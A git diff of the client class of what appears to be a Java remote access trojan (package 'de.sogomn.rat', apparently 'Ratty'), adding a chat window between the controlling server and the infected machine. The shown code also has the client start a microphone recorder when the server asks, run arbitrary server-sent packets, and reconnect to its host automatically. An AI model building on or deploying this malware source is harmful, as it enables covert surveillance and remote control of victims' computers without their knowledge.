@@ -1,15 +1,26 @@
 package de.sogomn.rat;
 
+import de.sogomn.rat.packet.ChatPacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.VoicePacket;
+import de.sogomn.rat.server.gui.ChatWindow;
+import de.sogomn.rat.server.gui.IGuiController;
 import de.sogomn.rat.util.VoiceRecorder;
 
-public final class Client implements IConnectionObserver {
+public final class Client implements IConnectionObserver, IGuiController {
+	
+	private ActiveConnection connection;
+	
+	private ChatWindow chat;
 	
 	private static final int VOICE_BUFFER_SIZE = 1024 << 6;
 	
-	public Client() {
-		//...
+	public Client(final ActiveConnection connection) {
+		this.connection = connection;
+		
+		chat = new ChatWindow(this);
+		
+		chat.addListener(this);
 	}
 	
 	private void handleVoiceRequest(final ActiveConnection connection) {
@@ -25,12 +36,26 @@ public final class Client implements IConnectionObserver {
 		voiceRecorder.start();
 	}
 	
+	private void handleChatPacket(final ChatPacket packet) {
+		final String message = packet.getMessage();
+		
+		if (!chat.isVisible()) {
+			chat.setVisible(true);
+		}
+		
+		chat.addLine(message);
+	}
+	
 	@Override
 	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
 		final Class<? extends IPacket> clazz = packet.getClass();
 		
 		if (clazz == VoicePacket.class) {
 			handleVoiceRequest(connection);
+		} else if (clazz == ChatPacket.class) {
+			final ChatPacket chatPacket = (ChatPacket)packet;
+			
+			handleChatPacket(chatPacket);
 		} else {
 			packet.execute(connection);
 		}
@@ -41,9 +66,20 @@ public final class Client implements IConnectionObserver {
 		final String address = connection.getAddress();
 		final int port = connection.getPort();
 		
+		chat.close();
 		connection.setObserver(null);
 		
 		Ratty.connectToHost(address, port);
+	}
+	
+	@Override
+	public void userInput(final String command, final Object source) {
+		if (command == ChatWindow.MESSAGE_SENT) {
+			final String message = chat.getMessage();
+			final ChatPacket packet = new ChatPacket(message);
+			
+			connection.addPacket(packet);
+		}
 	}
 	
 }
